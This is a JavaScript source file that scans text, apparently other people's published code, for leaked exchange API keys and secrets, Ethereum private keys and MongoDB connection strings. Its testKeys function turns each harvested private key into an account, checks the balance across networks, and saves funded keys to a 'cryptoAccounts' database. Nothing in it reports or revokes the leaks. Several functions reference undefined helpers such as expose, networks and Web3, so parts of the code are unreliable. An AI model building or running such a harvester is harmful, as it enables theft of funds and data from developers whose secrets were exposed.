const mongoose = require('mongoose')
const ccxt = require('ccxt')


export const unique = array => {
    return array.filter((a, b) => array.indexOf(a) ===b)
  }
export const clean = string => {
    return string
        .replace(/\s/g, "")
        .replace(/['"]+/g, '')
        .replace(/['']+/g, '')
        .replace(/['=']+/g, '')
        .replace(/[':']+/g, '')
        .replace(/['//']+/g, '')
  }
export const initSecretKeyPrefixes = () => {
    const secretKeyPrefixes = ['secret', 'secret_key', 'api_secret', 'API_SECRET', 'SECRET_KEY', 'SECRET', 'apiSecret', 'binanceSecret', 'BINANCE_SECRET_KEY', 'binanceSecretKey', 'BINANCE_SECRET'] // these are variable name variations ive seen out in the wild people are using when naming their api key variables.
                              // I'm using these as a way to identify api keys in peoples code.
                              
    const exchangeSecretKeyPrefixes = ccxt.exchanges.map(item => {
      return [`${item}_secret_key`, `${item.toUpperCase()}_SECRET`, `${item}SecretKey`, `${item}secretKey`, `${item.toUpperCase()}_SECRET_KEY`, `${item}secret`, `${item}Secret`]
    })
    return [secretKeyPrefixes, ...exchangeSecretKeyPrefixes]
}
export const initApiKeyPrefixes = () => {
    const apiKeyPrefixes = ['apiKey', 'api_key', 'BINANCE_API_KEY', 'API_KEY'] // these are variable name variations ive seen out in the wild people are using when naming their api key variables.
                              // I'm using these as a way to identify api keys in peoples code.
                              
    const exchangeApiKeyPrefixes = ccxt.exchanges.map(item => {
      return [
        `${item}_api_key`, 
        `${item}_API_KEY`, 
        `${item}ApiKey`, 
        `${item}Key`, 
        `${item.toUpperCase()}_api_key`, 
        `${item.toUpperCase()}_API_KEY`, 
        `${item.toUpperCase()}ApiKey`, 
        `${item.toUpperCase()}Key`
      ]
    })
    return [apiKeyPrefixes, ...exchangeApiKeyPrefixes]
  }

export const testKeys = expose(async keys => {
    let { privateKeys}  = keys;
    if(privateKeys.length > 0) {
      //console.log(privateKeys)
      return Promise.all(Promise.map(privateKeys, async (key) => {
        return Promise.map(networks, async network => {
          let w3 = new Web3(network)
          let account
          let balance
          try {
            account = await w3.eth.accounts.privateKeyToAccount(key)
            balance = await w3.eth.getBalance(account.address)
            if(balance > 0) {
              console.log(account)
              console.log('wei balance', balance)
             return mongoose.model('cryptoAccounts').create({
                privateKey: key,
                balance,
                address: account.address
              })
            }
          }
          catch(err) {
            //console.log('account didnt work', key)
            Sentry.captureException(err)
            return Promise.resolve(key)
          }
        })
      }))
    }
  
  })
export const parseForPrivateKeys = expose(data => {
    let regex = /16([a-zA-Z]+([0-9]+[a-zA-Z]+)+)9/g; //for identifying private keys
    let regex2 = /[0-9]+([a-zA-Z]+([0-9]+[a-zA-Z]+)+)/g; // also for identifying private keys
   
    let regexs = [regex, regex2]
    
    let privateKeys = []
    
   
    regexs.forEach(regexExpression => {
      const match = data.match(regexExpression)
      //console.log({match, regexExpression})
      if(match !== null) {
        match.forEach(potential => {
          if(potential.length === 64) {
            //console.log('potential key', potential)
            privateKeys.push(potential)
          }
        })
      }
     
    })
    return {privateKeys}
  })
export const parseForMongoDatabaseUrls = expose(data => {
  let startingKeyword = 'mongodb'
  let endingKeyWord = 'majority'
  let endingKeyWordLength = endingKeyWord.length
  let startingIndex = data.match(startingKeyword, 'g')['index']
  let endingIndex = data.match(endingKeyWord)['index']
  let mongodbUrl = data.substring(startingIndex, endingIndex+endingKeyWordLength)
  return mongodbUrl
})

export const parseForBinanceKeys = expose(async data => {
    
    const apiKeyPrefixes = initApiKeyPrefixes().reduce((a, b) => [...a, ...b])
    const secretKeyPrefixes = initSecretKeyPrefixes().reduce((a, b) => [...a, ...b])
    
    
    const initialHits = apiKeyPrefixes.map(prefix => ({match: data.match(prefix, 'g'), prefix}))
    let initialHitsForSecrets = secretKeyPrefixes.map(prefix => ({match: data.match(prefix), prefix}))
    let tmpTokens
    let tmpSecrets
    try {
        tmpTokens = initialHits.filter(hit => hit.match !== null).map(result => {

            const {match, prefix} = result
            const indexOfMatch = match['index']
            const input = match['input']
            let keyStringInitial = input.substring(indexOfMatch, indexOfMatch+64+(prefix.length+4))
            let potentialKey = clean(keyStringInitial.split(prefix)[1])
            if(potentialKey.length === 64) {
                return potentialKey
            }
        
        })
    }
    catch(err){
        console.log('error with tmpTokens', err)
    }
    try {
        tmpSecrets = initialHitsForSecrets.filter(hit => hit.match !== null).map(result => {
            const {match, prefix} = result
            const indexOfMatch = match['index']
            const input = match['input']
            let keyStringInitial = input.substring(indexOfMatch, indexOfMatch+64+(prefix.length+4))
            let potentialSecret = clean(keyStringInitial.split(prefix)[1])
            if(potentialSecret.length === 64) {
                return potentialSecret
            }
            
        })
    }
    catch(err) {
        Sentry.captureException(err)
        console.log('error getting temp secrets', err)
    }

    const tokens = unique(tmpTokens.filter(token => token !== undefined))
    const secrets = unique(tmpSecrets.filter(secret => secret !== undefined))
    return {tokens, secrets}
})


  const combineObjects = ([head, ...[headTail, ...tailTail]]) => {
  if (!headTail) return head

  const combined = headTail.reduce((acc, x) => {
    return acc.concat(head.map(h => ({...h, ...x})))
  }, [])

  return combineObjects([combined, ...tailTail])
}